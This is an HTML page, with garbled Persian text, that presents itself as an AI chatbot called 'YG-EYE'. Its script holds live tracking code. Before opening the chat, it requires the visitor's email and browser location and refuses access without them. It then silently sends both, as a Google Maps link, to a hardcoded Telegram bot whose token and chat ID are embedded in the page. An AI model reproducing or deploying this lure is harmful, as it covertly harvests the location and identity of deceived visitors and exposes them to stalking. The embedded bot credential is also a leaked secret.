<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>YG-PYRAMID | Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ù‡Ø±Ù…</title>
    <style>
        body { background: #050505; color: #d4af37; font-family: Tahoma; text-align: center; margin: 0; padding: 20px; }
        .box { border: 2px solid #d4af37; padding: 20px; border-radius: 15px; background: #111; max-width: 400px; margin: auto; box-shadow: 0 0 20px #d4af37; }
        input, textarea { width: 90%; padding: 10px; margin: 10px 0; background: #000; color: #fff; border: 1px solid #d4af37; border-radius: 5px; }
        button { background: #d4af37; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; border-radius: 5px; }
        #chat-area { display: none; margin-top: 20px; border-top: 1px solid #d4af37; padding-top: 20px; }
        #ai-response { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; text-align: right; min-height: 50px; }
    </style>
</head>
<body>

<div class="box">
    <h1>YG-EYE</h1>
    <div id="login-section">
        <p>Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒØŒ Ø§ÛŒÙ…ÛŒÙ„ Ø®ÙˆØ¯ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯</p>
        <input type="email" id="u_email" placeholder="Ø§ÛŒÙ…ÛŒÙ„ Ø´Ù…Ø§...">
        <button onclick="activateSystem()">Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ù…ØºØ² Ù‡Ø±Ù…</button>
    </div>

    <div id="chat-area">
        <h3>Ù…ØºØ² Ù‡Ø±Ù… Ø¢Ù†Ù„Ø§ÛŒÙ† Ø§Ø³Øª</h3>
        <textarea id="user-msg" placeholder="Ø³ÙˆØ§Ù„ Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ù¾Ø±Ø³ÛŒØ¯..."></textarea>
        <button onclick="askAI()">Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ</button>
        <div id="ai-response">Ù…Ù†ØªØ¸Ø± Ø³ÙˆØ§Ù„ Ø´Ù…Ø§...</div>
    </div>
</div>

<script>
    const token = "8216584091:AAE5fPf-wUV1_Na87mEKB15qXyXqilNvpbo";
    const chat = "8496996244";

    function activateSystem() {
        const email = document.getElementById('u_email').value;
        if (!email) { alert("Ø§ÛŒÙ…ÛŒÙ„ Ø§Ù„Ø²Ø§Ù…ÛŒ Ø§Ø³Øª!"); return; }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                const mapLink = "http://google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø´Ù…Ø§
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=ğŸ‘¤ ${email} ÙˆØ§Ø±Ø¯ Ø´Ø¯.\nğŸ“ Ø¢Ø¯Ø±Ø³: ${mapLink}`);
                
                // Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ø¨Ø®Ø´ Ú†Øª
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('chat-area').style.display = 'block';
            }, function() {
                alert("Ø¨Ø¯ÙˆÙ† ØªØ§ÛŒÛŒØ¯ Ù…Ú©Ø§Ù†ØŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ù…Ø³Ø¯ÙˆØ¯ Ø§Ø³Øª.");
            });
        }
    }

    async function askAI() {
        const msg = document.getElementById('user-msg').value;
        const respBox = document.getElementById('ai-response');
        respBox.innerText = "Ø¯Ø± Ø­Ø§Ù„ ØªÙÚ©Ø±...";

        try {
            // Ø§ÛŒÙ† Ø¨Ø®Ø´ Ø¨Ù‡ Ollama Ø±ÙˆÛŒ Ú©Ø§Ù…Ù¾ÛŒÙˆØªØ± Ø´Ù…Ø§ ÙˆØµÙ„ Ù…ÛŒâ€ŒØ´ÙˆØ¯
            const response = await fetch("http://localhost:11434/api/generate", {
                method: "POST",
                body: JSON.stringify({
                    model: "llama3", // Ù†Ø§Ù… Ù…Ø¯Ù„ÛŒ Ú©Ù‡ Ø¯Ø± Ollama Ø¯Ø§Ø±ÛŒØ¯
                    prompt: msg,
                    stream: false
                })
            });
            const data = await response.json();
            respBox.innerText = data.response;
        } catch (err) {
            respBox.innerText = "Ø®Ø·Ø§: Ù…ØºØ² Ù…Ø­Ù„ÛŒ (Ollama) Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª. Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ Ollama Ø±ÙˆÛŒ Ú©Ø§Ù…Ù¾ÛŒÙˆØªØ±ØªØ§Ù† Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§Ø³Øª.";
        }
    }
</script>

</body>
</html>
